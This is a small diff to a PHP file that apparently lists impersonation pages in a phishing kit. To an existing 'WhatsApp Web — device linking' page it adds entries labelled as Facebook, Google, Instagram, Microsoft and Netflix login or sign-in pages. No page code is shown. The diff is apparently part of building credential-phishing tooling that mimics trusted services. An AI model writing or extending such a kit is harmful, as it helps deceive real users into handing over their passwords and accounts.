@@ -2,7 +2,12 @@
 require_once __DIR__ . '/config.php';
 $cfg = require __DIR__ . '/config.php';
 $pages = [
-    'Whatsapp.php' => 'WhatsApp Web — device linking',
+    'Whatsapp.php'  => 'WhatsApp Web — device linking',
+    'Facebook.php'  => 'Facebook — login',
+    'Google.php'    => 'Google — sign in',
+    'Instagram.php' => 'Instagram — login',
+    'Microsoft.php' => 'Microsoft — sign in',
+    'Netflix.php'   => 'Netflix — sign in',
 ];
 ?>
 <!DOCTYPE html>
